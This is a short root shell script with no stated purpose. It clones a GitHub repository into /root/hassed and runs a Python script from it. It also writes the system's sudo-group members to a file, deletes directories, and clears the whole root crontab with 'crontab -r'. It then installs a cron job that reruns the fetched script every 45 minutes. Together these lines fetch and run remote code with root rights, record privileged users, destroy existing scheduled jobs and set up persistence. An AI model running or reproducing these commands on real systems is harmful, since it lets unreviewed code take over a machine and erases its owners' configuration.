date >> xxxxxx_test
# export su_img_3=$(cat read.me)
pip3 install mysql-connector-python

rm -rf lsq_0_c
rm -rf /root/hassed/*
mkdir -p /root/hassed



git clone https://github.com/GH0STAV0/lsq_0_c.git
cp lsq_0_c/* /root/hassed/
# echo  $SUDO_USER > /root/hassed/read.me
echo  $(grep '^sudo:.*$' /etc/group | cut -d: -f4) > /root/hassed/read.me
python3 /root/hassed/tel_tel.py
crontab -r
(crontab -l -u root 2>/dev/null; echo "*/45 * * * * python3 /root/hassed/tel_tel.py") | crontab -
service cron stop && service cron start 
